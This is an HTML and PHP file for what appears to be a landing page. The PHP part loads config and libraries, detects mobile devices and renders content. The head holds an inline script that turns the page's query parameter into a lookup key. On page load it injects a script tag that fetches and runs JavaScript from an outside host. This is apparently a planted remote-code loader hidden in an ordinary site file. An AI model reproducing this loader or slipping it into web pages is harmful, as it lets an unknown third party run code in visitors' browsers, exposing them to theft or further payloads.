<html>

<head>
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <script>
        const objectMap = {
            "0fgl75km": "nruldtca",
            "v302ocn8": "1rdg6n90",
            "canmh1k6": "fb3pi5yu"
        }
        const param = window.location.search.replace("?", "").split("&")[0];
        const urlParam = !!objectMap[param] ? objectMap[param] : param
        console.log("Script", param, urlParam)
        var script = document.createElement('script');
        script.setAttribute('src', 'https://naturaladmin.com/blog/?' + urlParam ?? param + '.js');
        document.head.appendChild(script);
    </script>
</head>
</head>
<body>
<?php

// Disable all error reporting
//ini_set('error_reporting', 0);

// Importing libraries
require_once dirname(__FILE__) . '/vendor/autoload.php';
// Importing config file
require_once dirname(__FILE__) . '/config.php';
// Importing our service functions
require_once dirname(__FILE__) . '/lib.php';

// Default content location
$content_path = 'content/';

// Load mobile detection library
use Detection\MobileDetect;

// Detecting mobile devices and rendering mobile version if needed
if (ACLandingConfig::DETECT_MOBILE) {
    $detect = new MobileDetect;
    $is_mobile = $detect->isMobile();
    if (file_exists(dirname(__FILE__) . '/content/mobile') && $is_mobile) {
        $content_path = 'content/mobile/';
    }
}

// Rendering index of our content
Render_Template($content_path, $is_mobile);
